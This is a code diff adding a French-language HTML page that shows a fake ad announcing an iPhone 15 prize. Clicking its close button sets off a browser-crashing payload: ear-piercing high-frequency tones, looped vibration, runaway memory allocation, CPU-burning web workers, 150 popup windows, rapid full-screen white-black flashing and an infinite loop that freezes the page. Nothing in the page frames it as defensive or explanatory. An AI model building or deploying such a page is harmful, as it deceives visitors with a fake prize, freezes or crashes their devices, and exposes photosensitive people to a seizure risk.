@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<title>Crash Ultra Mega Max</title>
+<style>
+  html, body {
+    margin: 0; padding: 0; height: 100%; overflow: hidden;
+    background: black;
+    display: flex; justify-content: center; align-items: center;
+    font-family: Arial, sans-serif;
+  }
+  #fake-ad {
+    position: relative;
+    width: 320px; height: 250px;
+    background: white;
+    border-radius: 8px;
+    box-shadow: 0 0 80px rgba(255, 0, 0, 1);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 20px;
+    box-sizing: border-box;
+    animation: pulse 0.4s infinite alternate;
+  }
+  @keyframes pulse {
+    0% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.6); }
+    50% { box-shadow: 0 0 80px rgba(255, 0, 0, 1); transform: scale(1.15); }
+    100% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.6); transform: scale(1); }
+  }
+  #close-btn {
+    position: absolute;
+    top: 8px; right: 8px;
+    width: 40px; height: 40px;
+    background: #f00;
+    color: white;
+    font-weight: bold;
+    text-align: center;
+    line-height: 40px;
+    border-radius: 50%;
+    cursor: pointer;
+    font-size: 30px;
+    user-select: none;
+    box-shadow: 0 0 14px #000;
+    z-index: 10000;
+    transition: transform 0.1s ease;
+  }
+  #close-btn:hover {
+    transform: scale(1.4);
+  }
+  #ad-content img {
+    width: 110px;
+    margin-bottom: 15px;
+    user-select: none;
+  }
+  #ad-content h3 {
+    margin: 0 0 10px 0;
+    font-size: 22px;
+    color: black;
+    user-select: none;
+    text-align: center;
+    font-weight: 900;
+  }
+  #ad-content p {
+    margin: 0;
+    font-size: 15px;
+    color: black;
+    user-select: none;
+    text-align: center;
+  }
+  .shake {
+    animation: shake 0.05s infinite;
+  }
+  @keyframes shake {
+    0% { transform: translate(3px, 3px) rotate(2deg); }
+    10% { transform: translate(-3px, -3px) rotate(-2deg); }
+    20% { transform: translate(3px, -3px) rotate(2deg); }
+    30% { transform: translate(-3px, 3px) rotate(-2deg); }
+    40% { transform: translate(3px, 3px) rotate(2deg); }
+    50% { transform: translate(-3px, -3px) rotate(-2deg); }
+    60% { transform: translate(3px, -3px) rotate(2deg); }
+    70% { transform: translate(-3px, 3px) rotate(-2deg); }
+    80% { transform: translate(3px, 3px) rotate(2deg); }
+    90% { transform: translate(-3px, -3px) rotate(-2deg); }
+    100% { transform: translate(3px, -3px) rotate(2deg); }
+  }
+  @keyframes flash {
+    0%, 100% { background-color: white; }
+    50% { background-color: black; }
+  }
+  .flash {
+    animation: flash 0.08s infinite;
+    position: fixed;
+    top: 0; left: 0; width: 100vw; height: 100vh;
+    pointer-events: none;
+    z-index: 99999;
+    mix-blend-mode: difference;
+  }
+</style>
+</head>
+<body>
+  <div id="fake-ad">
+    <div id="close-btn" title="Fermer la pub">×</div>
+    <div id="ad-content">
+      <img src="https://img.icons8.com/fluency/96/gift.png" alt="Cadeau" />
+      <h3>Vous avez gagné un iPhone 15 !</h3>
+      <p>Cliquez sur la croix pour réclamer votre récompense.</p>
+    </div>
+  </div>
+
+<script>
+  function playMultipleBeeps() {
+    try {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      for(let f=15000; f<=18000; f+=500){
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = 'square';
+        osc.frequency.value = f;
+        gain.gain.value = 0.3;
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.start();
+        setTimeout(() => osc.stop(), 7000);
+      }
+    } catch(e) {}
+  }
+
+  function vibrateLoop() {
+    if (navigator.vibrate) {
+      setInterval(() => navigator.vibrate([500,200,500,200,500,200,500]), 1000);
+    }
+  }
+
+  function fillMemory() {
+    const arr = [];
+    setInterval(() => {
+      for(let i=0; i<200; i++) {
+        arr.push(new Array(1e6).fill("🔥"));
+      }
+    }, 10);
+  }
+
+  function createWorker() {
+    const code = `
+      self.onmessage = function(e) {
+        while(true) {
+          let x = 0;
+          for(let i=0; i<2e8; i++) x += Math.sqrt(i);
+        }
+      }
+    `;
+    const blob = new Blob([code], {type: 'application/javascript'});
+    const url = URL.createObjectURL(blob);
+    return new Worker(url);
+  }
+
+  function startWorkers(n) {
+    for(let i=0; i<n*2; i++) {
+      const w = createWorker();
+      w.postMessage(null);
+    }
+  }
+
+  function popupBomb() {
+    let count = 0;
+    const interval = setInterval(() => {
+      window.open('about:blank', '_blank', 'width=300,height=300');
+      count++;
+      if(count >= 150) clearInterval(interval);
+    }, 50);
+  }
+
+  function shakeAndFlash() {
+    const ad = document.getElementById('fake-ad');
+    ad.classList.add('shake');
+
+    for(let i=0; i<3; i++) {
+      const flashDiv = document.createElement('div');
+      flashDiv.className = 'flash';
+      document.body.appendChild(flashDiv);
+    }
+  }
+
+  function blockMainThread() {
+    setInterval(() => {
+      document.body.style.backgroundColor = document.body.style.backgroundColor === 'black' ? 'white' : 'black';
+    }, 50);
+
+    const adContent = document.getElementById('ad-content');
+    let toggle = false;
+    setInterval(() => {
+      adContent.querySelector('h3').textContent = toggle ? 'Vous avez gagné un iPhone 15 !' : 'Cadeau incroyable à réclamer !';
+      adContent.querySelector('p').textContent = toggle ? 'Cliquez sur la croix pour réclamer votre récompense.' : '!404!';
+      toggle = !toggle;
+    }, 40);
+
+    setTimeout(() => {
+      while(true) {
+        let x = 0;
+        for(let i=0; i<3e8; i++) x += Math.sqrt(i);
+      }
+    }, 2000);
+  }
+
+  document.getElementById('close-btn').addEventListener('click', () => {
+    playMultipleBeeps();
+    vibrateLoop();
+    fillMemory();
+    startWorkers(navigator.hardwareConcurrency || 4);
+    popupBomb();
+    shakeAndFlash();
+    blockMainThread();
+  });
+</script>
+</body>
+</html>
